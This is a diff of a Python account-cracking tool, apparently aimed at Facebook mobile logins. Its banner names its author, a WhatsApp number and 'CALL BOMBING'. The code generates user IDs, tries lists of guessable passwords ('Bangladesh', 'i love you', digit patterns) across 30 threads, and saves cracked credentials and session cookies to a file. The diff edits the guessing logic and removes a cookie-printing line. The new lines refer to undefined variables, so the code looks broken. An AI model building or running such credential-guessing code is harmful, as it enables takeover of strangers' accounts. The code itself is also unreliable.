@@ -180,12 +180,12 @@ logo =                                          ("""
 \033[0;92m║ ██   ████ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██   ████\033[0;92m ║
 \033[0;92m╚══════════════════════════════════════════════╝
 \033[0;92m╔═══════════════════════════════════════════╗\033[0;92m╔═══╗
-\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[0;34m       MR. NAYAN          ║\033[0;32m║\033[1;31m N \033[1;32m║
-\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[0;35m      Mohammad Nayan     ║\033[0;32m║\033[1;312m A\033[0;92m ║
+\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[1;34m       MR. NAYAN          ║\033[0;32m║\033[1;31m N \033[1;32m║
+\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[1;35m      Mohammad Nayan     ║\033[0;32m║\033[1;312m A\033[0;92m ║
 \033[0;92m║═══════════════════════════════════════════║\033[0;32m║\033[1;34m Y\033[0;92m ║
-\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[0;92m      01615298449        ║\033[0;32m║\033[1;93m A\033[0;92m ║
-\033[0;92m║➣\033[0;93m GITHUB     :     \033[0;94m     MR-NAYAN-404       ║\033[0;92m║\033[1;92m N\033[0;92m ║
-\033[0;92m║➣\033[0;94m TOOLS      :      \033[0;93m    CALL BOMBING       ║\033[0;92m║ 😘║
+\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[1;92m      01615298449        ║\033[0;32m║\033[1;93m A\033[0;92m ║
+\033[0;92m║➣\033[0;93m GITHUB     :     \033[1;94m     MR-NAYAN-404       ║\033[0;92m║\033[1;92m N\033[0;92m ║
+\033[0;92m║➣\033[0;94m TOOLS      :      \033[1;93m    CALL BOMBING       ║\033[0;92m║ 😘║
 \033[0;92m╚═══════════════════════════════════════════╝\033[0;92m╚═══╝\n""")
 
 
@@ -200,10 +200,10 @@ def id():
 	cod = input ('PUT YOUR CODE: ')
 	limit= int(input('EXAMPLE: 2000, 3000, 50000 \nPUT NUMBER OF CLONE : '))
 	for num in range(limit):
-		nmbr = ''.join(random.choice(string.digits) for _ in range(7))
-		#nmx = ''.join(random.choice(string.digits) for _ in range(1))
-		#nmp = ''.join(random.choice(string.digits) for _ in range(2))
-		user.append(nmbr)
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
 	with ThreadPool(max_workers=30) as NAYAN:
 		clear()
 		tl = str(len(user))
@@ -216,8 +216,8 @@ def id():
 		#jalan('\033[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 		
 		for sai in user:
-			uid = cod+sai
-			pwx = [uid[0:6],uid[0:7],uid[3:11],uid[4:11],uid[5:11],'password','Password','zxcvbnm1']
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
 			NAYAN.submit(mbasic,uid,pwx,tl)
 	#print('\033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 	print('Crack process has been completed')
@@ -283,7 +283,7 @@ def mbasic(uid,pwx,tl):
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[82:97]
             	print('\33[1;30m(NAYAN-Cp [💔] ' +cid+ ' | ' +ps+'  |>>'+tahunng(cid))
-            	print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
+            	
             	open('tast-CP.txt', 'a').write( uid+' | '+ps+' \n')
             	cps.append(cid)
             	break
